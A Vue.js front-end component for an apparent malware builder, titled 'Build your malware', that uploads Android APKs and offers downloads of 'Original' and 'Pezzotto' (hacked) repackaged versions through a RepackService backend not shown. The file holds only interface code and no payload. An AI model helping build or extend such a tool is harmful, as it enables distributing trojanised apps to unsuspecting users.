<template>
  <mdb-container id="builder">
    <mdb-row class="justify-content-center">
      <h1 class="h1-responsive font-weight-bold text-center my-5">Build your malware</h1>
    </mdb-row>

    <form @submit.prevent="upload()">
      <mdb-card class="justify-content-center">
        <mdb-card-body>
          <mdb-card-title>Upload an apk</mdb-card-title>
          <mdb-input label="title" v-model="new_apk_title"/>
          <mdb-input label="description" v-model="new_apk_description"/>

          <div class="dropbox">
            <input class="input-file" type="file" ref="file" v-on:change="filesChange($event)" accept="apk">
            <p v-if="!file">
              Drag your file <br> or click to browse
            </p>
            <p v-else>
              {{ file.name }}
            </p>
          </div>

          <mdb-row v-if="loading">
            <div class="spinner-border spinner-grow-sm text-success" role="status">
              <span class="sr-only">Loading...</span>
            </div>
          </mdb-row>


          <input class="btn dark-button text-white ripple-parent" type="submit" value="Update payload">
        </mdb-card-body>
      </mdb-card>
    </form>

    <mdb-row class="justify-content-center">
      <h2 class="h2-responsive font-weight-bold text-center my-5">Available apks</h2>
    </mdb-row>

    <mdb-row class="justify-content-center">
      <mdb-col sm="12" md="6" lg="4" v-for="(entry, index) in entries" v-bind:key="index">
        <mdb-card class="h-100">
          <mdb-card-body>
            <mdb-card-title>{{ entry.title }}</mdb-card-title>
            <mdb-card-text>{{ entry.description }}</mdb-card-text>

            <mdb-row class="justify-content-center">
              <mdb-col v-if="entry.original_file" sm="12" md="6" lg="6" class="justify-content-center">
                <mdb-btn color="grey-lighten-5"
                         class="btn dark-button grey-lighten-5 text-unique-color-dark ripple-parent"
                         v-on:click="download(entry.original_file)"><i class="fas fa-download"></i> Original
                </mdb-btn>
              </mdb-col>
              <mdb-col  sm="12" md="6" lg="6" class="justify-content-center">
                <mdb-btn color="grey-lighten-5"
                         class="btn dark-button grey-lighten-5 text-unique-color-dark ripple-parent"
                         v-on:click="download(entry.hacked_file)"><i class="fas fa-download"></i> Pezzotto
                </mdb-btn>
              </mdb-col>
            </mdb-row>

            <mdb-btn color="grey-lighten-5"
                     class="btn dark-button grey-lighten-5 text-unique-color-dark ripple-parent"
                     v-on:click="generatePezzotto(entry.original_file)"><i class="fas fa-download"></i> Generate Pezzotto
            </mdb-btn>

          </mdb-card-body>
        </mdb-card>
      </mdb-col>
    </mdb-row>

  </mdb-container>
</template>

<script>
import {mdbBtn, mdbCard, mdbCardBody, mdbCardText, mdbCardTitle, mdbCol, mdbContainer, mdbInput, mdbRow} from 'mdbvue';
import RepackService from "@/services/RepackService";

export default {
  name: "Devices",
  components: {
    mdbContainer,
    mdbRow,
    mdbCard,
    mdbCardBody,
    mdbCardTitle,
    mdbInput,
    mdbCol,
    mdbCardText,
    mdbBtn
  },
  data() {
    return {
      new_apk_title: "",
      new_apk_description: "",
      file: null,
      loading: false,
      entries: []
    }
  },
  mounted() {
    this.getEntries();
  },
  methods: {
    filesChange(event) {
      if (event.target.files && event.target.files.length > 0) {
        console.log(event.target.files[0])
        this.file = event.target.files[0];
      }
    },
    upload() {
      this.loading = true;
      let formData = new FormData();
      formData.set("uploaded_file", this.file, this.file.name)

      console.log(formData)
      RepackService.uploadApk(formData)
          .then((response) => {
            RepackService.createEntry(response.data.sha1, this.new_apk_title, this.new_apk_description)
                .then(() => {
                  this.getEntries();
                })
                .catch((error) => {
                  console.log(error);
                })
          })
          .catch((error) => {
            console.log(error);
          })
          .finally(() => {
            this.loading = false;
          })
    },
    getEntries() {
      RepackService.getEntries()
          .then((entries) => {
            console.log(entries.data)
            this.entries = entries.data
          })
          .catch(() => {
            console.log("AAAA")
          })
    },
    download(hash_sha1) {
      RepackService.downloadApk(hash_sha1)
      .then((response) => {
        const blob = new Blob([response.data])
        const link = document.createElement('a')
        link.href = URL.createObjectURL(blob)
        link.download = hash_sha1 + ".apk"
        link.click()
        URL.revokeObjectURL(link.href)
      })
    },
    generatePezzotto(hash_sha1) {
      console.log(hash_sha1)
    }
  }
}
</script>

<style scoped>
.dropbox {
  outline: 2px dashed grey; /* the dash box */
  outline-offset: -10px;
  background: lightcyan;
  color: dimgray;
  padding: 10px 10px;
  min-height: 200px; /* minimum height */
  position: relative;
  cursor: pointer;
}

.input-file {
  opacity: 0; /* invisible but it's there! */
  width: 100%;
  height: 200px;
  position: absolute;
  cursor: pointer;
}

.dropbox:hover {
  background: lightblue; /* when mouse over to the drop zone, change color */
}

.dropbox p {
  font-size: 1.2em;
  text-align: center;
  padding: 50px 0;
}
</style>